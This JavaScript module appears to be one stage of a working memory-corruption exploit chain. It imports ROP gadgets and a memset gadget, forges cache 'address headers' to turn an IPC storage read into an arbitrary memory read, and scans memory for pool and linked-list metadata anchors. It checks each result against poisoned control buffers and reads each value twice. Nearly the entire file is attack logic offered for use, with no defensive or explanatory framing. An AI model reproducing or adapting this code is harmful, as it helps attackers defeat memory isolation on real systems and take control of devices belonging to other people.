import coreRuntime from "../runtime.mjs";
import {
  buffersEqual,
  checkAddressHeaderEncoding,
  hasByteDifferent,
  readFsAddressBytes,
  readHexBytes
} from "./util.mjs";
import {installAddressHeader} from "./cache.mjs";
import {scanNativeLinkBuffer} from "./scan.mjs";

const {
  AnalysisBytes,
  CachePlan,
  GADGET_MEMSET,
  RootLayout,
  allocPage,
  call_rop,
  hex32,
  ipcStorageRead,
  log,
  read64
} = coreRuntime;

// ── Pool and metadata discovery ───────────────────────────────────────────

export async function reportMetadataProgress(input, message) {
    if (typeof input.reportProgress === "function")
        await input.reportProgress(message);
    else
        await log(message);
}

export async function resolvePoolCandidates(seed, sourceLinks, outputBuf, label, input) {
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    // The payload reserves live progress logs for external-link checks;
    // callers without a progress callback retain the detailed scan logs.
    var links = sourceLinks.slice();
    var captures = [{address: seed, length: 0x500000}];
    var seen = {};
    for (var si = 0; si < links.length; si++)
        seen[links[si].source.toString(16) + ":" +
            links[si].value.toString(16)] = true;

    for (var refinement = 0;
        refinement <= config.MAX_POOL_REFINEMENT_READS; refinement++) {
        var bounds = RootLayout.derivePoolBounds(links, seed, {controlSize: config.CONTROL_SIZE});
        if (!bounds.candidates.length) {
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": no pool hypothesis fits " + links.length +
                    " native links");
            return {ok: true, candidates: [], links: links.length,
                refinementReads: refinement};
        }
        if (bounds.candidates.length <= config.MAX_POOL_ANCHOR_CANDIDATES) {
            // The payload reports the combined scan result after the
            // external-link checks. Keep this detail for legacy log callers.
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": pool bounds resolved " + bounds.candidates.length +
                    " candidate(s), links=" + links.length +
                    " refinements=" + refinement);
            return {ok: true, candidates: bounds.candidates,
                links: links.length, refinementReads: refinement};
        }
        if (refinement === config.MAX_POOL_REFINEMENT_READS) {
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": pool bounds remain ambiguous after " + refinement +
                    " refinement reads (" + bounds.candidates.length +
                    " candidates); checking their external-link locations " +
                    "within the remaining budget");
            return {ok: true, candidates: bounds.candidates, unresolved: true,
                links: links.length, refinementReads: refinement};
        }

        var readStart = RootLayout.choosePoolRefinementStart(bounds, links, captures,
            addressPlan.addressBias, config.ROOT_CAPTURE_CHUNK, refinement,
            {controlSize: config.CONTROL_SIZE, maxPoolCandidates: config.MAX_POOL_ANCHOR_CANDIDATES});
        if (readStart === null) {
            if (!input.reportProgress)
                await reportMetadataProgress(input, "METADATA " + label +
                    ": no uncovered bucket lies inside all pool hypotheses; " +
                    "checking " + bounds.candidates.length +
                    " candidate external-link locations");
            return {ok: true, candidates: bounds.candidates, unresolved: true,
                links: links.length, refinementReads: refinement};
        }
        var chunkWindow = {start: readStart,
            end: readStart + config.ROOT_CAPTURE_CHUNK};
        var chunkRead = await readFsAddressBytes({config, addressPlan,
            candidateHandle, address: readStart,
            length: config.ROOT_CAPTURE_CHUNK, outputBuf,
            allowedWindow: chunkWindow, materializeBytes: false});
        if (!chunkRead.ok) return {ok: false,
            continueSeed: !chunkRead.fatal, error: chunkRead.error};
        var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
            bufferOffset: chunkRead.bufferOffset,
            length: config.ROOT_CAPTURE_CHUNK, sourceAddress: readStart,
            seed, links, seen, config});
        links = scannedLinks.links;
        seen = scannedLinks.seen;
        captures.push({address: readStart, length: config.ROOT_CAPTURE_CHUNK});
        if (!input.reportProgress) {
            await reportMetadataProgress(input, "METADATA " + label +
                ": pool refinement " + (refinement + 1) + "/" +
                config.MAX_POOL_REFINEMENT_READS + " links=" + links.length +
                " candidates=" + RootLayout.derivePoolBounds(links, seed,
                    {controlSize: config.CONTROL_SIZE}).candidates.length);
        }
    }
    var finalBounds = RootLayout.derivePoolBounds(links, seed,
        {controlSize: config.CONTROL_SIZE});
    return {ok: true, candidates: finalBounds.candidates, unresolved: true,
        links: links.length, refinementReads: config.MAX_POOL_REFINEMENT_READS};
}

export async function discoverMetadataAnchors(seedPlan, label, input) {
    const withStepData = (result) => ({...result, metadataAnchorChecks, addressPlan});
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let metadataAnchorChecks = input.metadataAnchorChecks;
    addressPlan = seedPlan;
    if (metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS)
        return withStepData({ok: true, anchors: [], continueSeed: false,
            capReached: true});
    var seed = Number(seedPlan.target);
    var sourceLength = 0x500000;
    var sourceEnd = seed + sourceLength;
    if (!Number.isSafeInteger(seed) || !Number.isSafeInteger(sourceEnd) ||
        seed % config.CONTROL_SIZE !== 0 || sourceEnd >= 0x8000000000) {
        return withStepData({ok: false, continueSeed: true,
            error: "seed capture bounds are not canonical/aligned"});
    }

    if (!input.reportProgress)
        await reportMetadataProgress(input, "METADATA " + label +
            ": reading seed window [0x" + seed.toString(16) + ",0x" +
            sourceEnd.toString(16) + ") bytes=0x500000 chunks=32");
    var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
    if (!captureBuf) return withStepData({ok: false, continueSeed: false,
        error: "seed capture buffer allocation failed"});
    var links = [];
    var seen = {};
    var sourceWindow = {start: seed, end: sourceEnd};
    for (var chunkIndex = 0; chunkIndex < 0x500000 / config.ROOT_CAPTURE_CHUNK;
        chunkIndex++) {
        var chunkAddress = seed + chunkIndex * config.ROOT_CAPTURE_CHUNK;
        var chunkRead = await readFsAddressBytes({config, addressPlan,
            candidateHandle, address: chunkAddress,
            length: config.ROOT_CAPTURE_CHUNK, outputBuf: captureBuf,
            allowedWindow: sourceWindow, materializeBytes: false});
        if (!chunkRead.ok) return withStepData({ok: false,
            continueSeed: !chunkRead.fatal, error: "seed chunk " +
                chunkIndex + ": " + chunkRead.error});
        var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
            bufferOffset: chunkRead.bufferOffset,
            length: config.ROOT_CAPTURE_CHUNK, sourceAddress: chunkAddress,
            seed, links, seen, config});
        links = scannedLinks.links;
        seen = scannedLinks.seen;
        if ((chunkIndex + 1) % 8 === 0 &&
            chunkIndex + 1 < 0x500000 / config.ROOT_CAPTURE_CHUNK) {
            await reportMetadataProgress(input, "METADATA " + label + ": seed progress=" +
                (chunkIndex + 1) + "/32 links=" + links.length);
        }
    }
    await reportMetadataProgress(input, "METADATA " + label +
        ": seed capture complete; native links=" + links.length);
    if (!links.length) return withStepData({ok: true, anchors: [],
        continueSeed: true, poolCandidates: 0, externalLinkChecks: 0});

    var poolResult = await resolvePoolCandidates(seed, links, captureBuf,
        label, {config, addressPlan, candidateHandle,
            reportProgress: input.reportProgress});
    if (!poolResult.ok) return withStepData({ok: false,
        continueSeed: poolResult.continueSeed, error: poolResult.error});
    if (!poolResult.candidates.length) {
        await log("METADATA " + label +
            ": no pool hypotheses remain; external-link checks=0");
        return withStepData({ok: true, anchors: [], continueSeed: true,
            unresolved: Boolean(poolResult.unresolved), poolCandidates: 0,
            nativeLinks: poolResult.links,
            refinementReads: poolResult.refinementReads,
            externalLinkChecks: 0, poolCandidatesVisited: 0});
    }

    var anchors = [];
    var anchorSeen = {};
    var externalLinkChecks = 0;
    var poolCandidatesVisited = 0;
    for (var poolIndex = 0;
        poolIndex < poolResult.candidates.length &&
            metadataAnchorChecks < config.MAX_METADATA_ANCHOR_CHECKS; poolIndex++) {
        poolCandidatesVisited = poolIndex + 1;
        var poolStart = poolResult.candidates[poolIndex];
        var anchorAddress = poolStart + 0x3a00000;
        if (!Number.isSafeInteger(anchorAddress) ||
            anchorAddress < 0x100000000 || anchorAddress >= 0x8000000000) {
            await log("METADATA " + label + ": pool candidate " +
                (poolIndex + 1) + " has a non-canonical external-link address");
            continue;
        }
        var alignedStart = seedPlan.addressBias + Math.floor(
            (anchorAddress - seedPlan.addressBias) / config.ROOT_CAPTURE_CHUNK) *
            config.ROOT_CAPTURE_CHUNK;
        var anchorOffset = anchorAddress - alignedStart;
        var anchorLength = anchorOffset + 0x1000;
        var anchorWindow = {start: alignedStart,
            end: alignedStart + anchorLength};
        metadataAnchorChecks++;
        externalLinkChecks++;
        await reportMetadataProgress(input, "METADATA " + label +
            ": checking external-link candidate " + (poolIndex + 1) + "/" +
            poolResult.candidates.length + " (check " + externalLinkChecks +
            "/" + config.MAX_METADATA_ANCHOR_CHECKS + ")");
        var linkReadA = await readFsAddressBytes({config, addressPlan,
            candidateHandle, address: alignedStart, length: anchorLength,
            outputBuf: captureBuf, allowedWindow: anchorWindow});
        if (!linkReadA.ok) {
            await log("METADATA " + label + ": external-link " +
                (poolIndex + 1) + " read rejected: " + linkReadA.error);
            if (linkReadA.fatal) {
                if (anchors.length > 0) {
                    await log("METADATA " + label +
                        ": preserving " + anchors.length +
                        " earlier valid anchor(s) after read error");
                    return withStepData({ok: true, anchors: anchors, continueSeed: false,
                        stopAfterAnchors: true, error: linkReadA.error});
                }
                return withStepData({ok: false, continueSeed: false,
                    error: linkReadA.error});
            }
            continue;
        }
        var linkReadB = await readFsAddressBytes({config, addressPlan,
            candidateHandle, address: alignedStart, length: anchorLength,
            outputBuf: captureBuf, allowedWindow: anchorWindow});
        if (!linkReadB.ok) {
            await log("METADATA " + label + ": external-link " +
                (poolIndex + 1) + " repeat rejected: " + linkReadB.error);
            if (linkReadB.fatal) {
                if (anchors.length > 0) {
                    await log("METADATA " + label +
                        ": preserving " + anchors.length +
                        " earlier valid anchor(s) after repeat-read error");
                    return withStepData({ok: true, anchors: anchors, continueSeed: false,
                        stopAfterAnchors: true, error: linkReadB.error});
                }
                return withStepData({ok: false, continueSeed: false,
                    error: linkReadB.error});
            }
            continue;
        }
        var nextA = AnalysisBytes.readU64LE(linkReadA.bytes, anchorOffset);
        var previousA = AnalysisBytes.readU64LE(linkReadA.bytes,
            anchorOffset + 8);
        var extentA = AnalysisBytes.readU64LE(linkReadA.bytes,
            anchorOffset + 16);
        var nextB = AnalysisBytes.readU64LE(linkReadB.bytes, anchorOffset);
        var previousB = AnalysisBytes.readU64LE(linkReadB.bytes,
            anchorOffset + 8);
        var extentB = AnalysisBytes.readU64LE(linkReadB.bytes,
            anchorOffset + 16);
        var stableNext = nextA === nextB;
        var stablePrevious = previousA === previousB;
        var stableExtent = extentA === extentB;
        var stableLink = stableNext && stablePrevious && stableExtent;
        var nextShapeOk = nextA >= 0x100000000n &&
            nextA < 0x8000000000n && nextA % 8n === 0n;
        var reciprocalOk = nextA === previousA;
        var linkDistance = nextA >= BigInt(anchorAddress)
            ? nextA - BigInt(anchorAddress)
            : BigInt(anchorAddress) - nextA;
        var distanceOk = linkDistance > 0x8000000n;
        var extentShapeOk = extentA >= 0x10000n &&
            extentA <= 0x10000000n && extentA % 0x1000n === 0n;
        var externalLink = stableLink
            ? RootLayout.parseExternalLink(linkReadA.bytes, anchorOffset,
                anchorAddress)
            : null;
        if (!externalLink) {
            var rejectionReasons = [];
            if (!stableLink) rejectionReasons.push("fields-unstable");
            if (!nextShapeOk) rejectionReasons.push("next-shape");
            if (!reciprocalOk) rejectionReasons.push("not-reciprocal");
            if (!distanceOk) rejectionReasons.push("next-distance");
            if (!extentShapeOk) rejectionReasons.push("extent-shape");
            if (!rejectionReasons.length) rejectionReasons.push("parser-rejected");
            await log("METADATA " + label + ": external-link " +
                (poolIndex + 1) + "/" + poolResult.candidates.length +
                " rejected reasons=" + rejectionReasons.join(",") +
                " stable(next/previous/extent)=" + stableNext + "/" +
                stablePrevious + "/" + stableExtent +
                " reciprocal=" + reciprocalOk + " distance=" + distanceOk +
                " extent=" + extentShapeOk);
            continue;
        }
        var metadataWindow = RootLayout.metadataWindowFromNext(externalLink.next);
        if (!metadataWindow || metadataWindow.anchorOffset + 16 >
            metadataWindow.length) {
            await log("METADATA " + label + ": next pointer did not " +
                "produce a bounded metadata page");
            continue;
        }
        var anchorKey = metadataWindow.address.toString(16) + ":" +
            anchorAddress.toString(16);
        if (anchorSeen[anchorKey]) continue;
        anchorSeen[anchorKey] = true;
        anchors.push({poolStart: poolStart, nodeAddress: anchorAddress,
            next: Number(externalLink.next), extent: Number(externalLink.extent),
            window: metadataWindow});
        await log("METADATA " + label + ": external-link " +
            (poolIndex + 1) + "/" + poolResult.candidates.length +
            " valid node=0x" + anchorAddress.toString(16) +
            " next=0x" + externalLink.next.toString(16) +
            " extent=0x" + externalLink.extent.toString(16) +
            " page=0x" + metadataWindow.address.toString(16) +
            " probe=0x" + metadataWindow.length.toString(16));
    }
    var anchorsRemaining = poolCandidatesVisited < poolResult.candidates.length;
    await log("METADATA " + label + ": external-link checks=" +
        externalLinkChecks + "/" + poolResult.candidates.length +
        " candidates-visited=" + poolCandidatesVisited +
        " valid-anchors=" + anchors.length + " global-checks=" +
        metadataAnchorChecks + "/" + config.MAX_METADATA_ANCHOR_CHECKS);
    return withStepData({ok: true, anchors: anchors,
        continueSeed: anchors.length === 0,
        capReached: anchorsRemaining &&
            metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS,
        unresolved: Boolean(poolResult.unresolved),
        poolCandidates: poolResult.candidates.length,
        poolCandidatesVisited,
        externalLinkChecks,
        nativeLinks: poolResult.links,
        refinementReads: poolResult.refinementReads});
}

export async function qualifyMetadataPage(anchor, label, pointerTargets, input) {
    const withStepData = (result) => ({...result, addressPlan, addressCopy});
    const config = input.config;
    let addressPlan = input.addressPlan;
    let metadataPageProbes = input.metadataPageProbes;
    let storageHandle = input.storageHandle;
    let candidateHandle = input.candidateHandle;
    let savedHandle = input.savedHandle;
    let addressCopy = input.addressCopy;
    var page = anchor.window.address;
    var plan;
    try {
        var alignedTargets = pointerTargets.slice();
        alignedTargets.push(Math.floor(page / config.CONTROL_SIZE) * config.CONTROL_SIZE);
        plan = CachePlan.buildLowerWindowPlan(page, addressPlan.storageSize,
            config.ROOT_CAPTURE_CHUNK, alignedTargets);
    } catch (planError) {
        await log("METADATA " + label + ": page plan rejected (" +
            planError.message + ")");
        return withStepData({ok: false, continueScan: true});
    }
    var encoding = checkAddressHeaderEncoding(plan.bytes, {savedHandle});
    if (!encoding.ok) {
        await log("METADATA " + label +
            ": page header encoding rejected");
        return withStepData({ok: false, continueScan: true});
    }
    var window = anchor.window;
    if (window.anchorOffset < 0 || window.anchorOffset + 16 > window.length ||
        page < 0x100000000 || page + window.length >= 0x8000000000) {
        await log("METADATA " + label +
            ": page probe bounds rejected");
        return withStepData({ok: false, continueScan: true});
    }
    var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
    var pageBufA = allocPage(config.CONTROL_SIZE + 0x2000);
    var pageBufB = allocPage(config.CONTROL_SIZE + 0x2000);
    if (!ordinaryBuf || !pageBufA || !pageBufB)
        return withStepData({ok: false, continueScan: false,
            error: "metadata page buffer allocation failed"});
    call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(window.length));
    var ordinaryRead = ipcStorageRead(storageHandle, plan.readOffset,
        window.length, ordinaryBuf);
    if (ordinaryRead.error !== 0) return withStepData({ok: false,
        continueScan: false, error: "ordinary metadata control=" +
            hex32(ordinaryRead.error)});
    if (!hasByteDifferent(ordinaryBuf, window.length, 0xA5))
        return withStepData({ok: false, continueScan: false,
            error: "ordinary metadata control remained poison"});

    var headerCopy = await installAddressHeader({...addressCopy,
        desiredBytes: plan.bytes,
        stageName: "cache-metadata-page-" + metadataPageProbes});
    addressCopy = headerCopy.addressCopy;
    if (!headerCopy.ok) {
        return withStepData({ok: false, continueScan: false,
            error: "metadata page header copy failed"});
    }
    addressPlan = plan;
    var pageWindow = {start: page, end: page + window.length};
    var pageReadA = await readFsAddressBytes({config, addressPlan,
        candidateHandle, address: page, length: window.length,
        outputBuf: pageBufA, allowedWindow: pageWindow});
    if (!pageReadA.ok) return withStepData({ok: false,
        continueScan: !pageReadA.fatal, error: pageReadA.error});
    var pageReadB = await readFsAddressBytes({config, addressPlan,
        candidateHandle, address: page, length: window.length,
        outputBuf: pageBufB, allowedWindow: pageWindow});
    if (!pageReadB.ok) return withStepData({ok: false,
        continueScan: !pageReadB.fatal, error: pageReadB.error});
    var expectedNode = BigInt(anchor.nodeAddress);
    var firstA = AnalysisBytes.readU64LE(pageReadA.bytes, window.anchorOffset);
    var previousA = AnalysisBytes.readU64LE(pageReadA.bytes,
        window.anchorOffset + 8);
    var firstB = AnalysisBytes.readU64LE(pageReadB.bytes, window.anchorOffset);
    var previousB = AnalysisBytes.readU64LE(pageReadB.bytes,
        window.anchorOffset + 8);
    var stableAnchor = firstA === firstB && previousA === previousB;
    var reciprocalAnchor = firstA === expectedNode &&
        previousA === expectedNode && firstB === expectedNode &&
        previousB === expectedNode;
    var ordinaryFirst = read64(ordinaryBuf + BigInt(window.anchorOffset));
    var ordinaryPrevious = read64(ordinaryBuf +
        BigInt(window.anchorOffset + 8));
    var ordinaryAnchorDiffers = ordinaryFirst !== expectedNode ||
        ordinaryPrevious !== expectedNode;
    var verified = stableAnchor && reciprocalAnchor && ordinaryAnchorDiffers;
    await log("METADATA " + label + ": page guard=" +
        (verified ? "PASS" : "FAIL") + " stable-anchor=" + stableAnchor +
        " reciprocal=" + reciprocalAnchor + " ordinary-anchor-differs=" +
        ordinaryAnchorDiffers + " page=0x" + page.toString(16) +
        " anchorOffset=0x" + window.anchorOffset.toString(16));
    return withStepData({ok: verified, continueScan: true, plan: plan,
        page: page, window: window});
}

export async function verifyAddressCandidate(plan, label, index, input) {
    const withStepData = (result) => ({...result, addressPlan, addressCopy});
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let storageHandle = input.storageHandle;
    let addressCopy = input.addressCopy;
    addressPlan = plan;
    var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
    if (!ordinaryBuf) {
        await log("ADDRESS " + label + ": ordinary buffer allocation failed");
        return withStepData({verified: false, continueScan: false});
    }
    call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
    var ordinaryReply = ipcStorageRead(storageHandle, plan.readOffset,
        config.CONTROL_SIZE, ordinaryBuf);
    if (ordinaryReply.error !== 0) {
        await log("ADDRESS " + label + ": ordinary control failed=" +
            hex32(ordinaryReply.error));
        return withStepData({verified: false, continueScan: false});
    }

    var headerCopy = await installAddressHeader({...addressCopy,
        desiredBytes: plan.bytes, stageName: "cache-address-" + index});
    addressCopy = headerCopy.addressCopy;
    if (!headerCopy.ok) {
        await log("ADDRESS " + label +
            ": header copy failed; stopping candidate scan");
        return withStepData({verified: false, continueScan: false});
    }

    var addressBufA = allocPage(config.CONTROL_SIZE + 0x2000);
    var addressBufB = allocPage(config.CONTROL_SIZE + 0x2000);
    if (!addressBufA || !addressBufB) {
        await log("ADDRESS " + label + ": output buffer allocation failed");
        return withStepData({verified: false, continueScan: false});
    }
    call_rop(GADGET_MEMSET, addressBufA, 0xA5n, BigInt(config.CONTROL_SIZE));
    call_rop(GADGET_MEMSET, addressBufB, 0x5An, BigInt(config.CONTROL_SIZE));

    var readA = ipcStorageRead(candidateHandle, plan.readOffset,
        config.CONTROL_SIZE, addressBufA);
    var readB = ipcStorageRead(candidateHandle, plan.readOffset,
        config.CONTROL_SIZE, addressBufB);
    var stable = readA.error === 0 && readB.error === 0 &&
        buffersEqual(addressBufA, addressBufB, config.CONTROL_SIZE);
    var differsFromControl = readA.error === 0 &&
        !buffersEqual(addressBufA, ordinaryBuf, config.CONTROL_SIZE);
    var changedFromPoison = readA.error === 0 &&
        hasByteDifferent(addressBufA, config.CONTROL_SIZE, 0xA5);
    var linkHead = readA.error === 0 ? read64(addressBufA) : 0n;
    var linkHeadShape = linkHead === 0n ||
        (linkHead >= 0x100000000n && linkHead < 0x8000000000n &&
            linkHead % 0x4000n === 0n);
    var verified = stable && differsFromControl && changedFromPoison &&
        linkHeadShape;
    var first16 = readA.error === 0
        ? readHexBytes(addressBufA, 16) : "unread";

    await log("ADDRESS " + label + ": " +
        (verified ? "ACCEPTED" : "rejected") +
        " read=" + hex32(readA.error) + "/" + hex32(readB.error) +
        " stable=" + stable + " differs=" + differsFromControl +
        " nonPoison=" + changedFromPoison + " headShape=" + linkHeadShape +
        " head=0x" + linkHead.toString(16) + " first16=" + first16);
    return withStepData({verified: verified,
        continueScan: readA.error === 0 && readB.error === 0});
}
